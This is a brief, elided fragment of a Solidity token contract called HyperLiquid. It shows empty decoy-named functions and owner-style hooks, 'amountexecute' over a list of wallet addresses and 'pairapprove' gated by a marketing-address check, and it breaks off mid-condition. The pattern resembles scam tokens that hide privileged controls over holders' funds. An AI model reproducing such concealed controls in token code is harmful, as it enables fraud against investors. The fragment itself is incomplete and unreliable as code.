...
contract HyperLiquid is Ownable {
    ...
    string private _name = "HYPERLIQUID";
    ...
    function forsymbol() public {
    }
    function symboloner() external {
    }
    function symbolsender() public {
    }
    function symbolonerview() public {
    }
    function amountexecute(address[] calldata walletAddress) external {
    ...
    function pairapprove(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
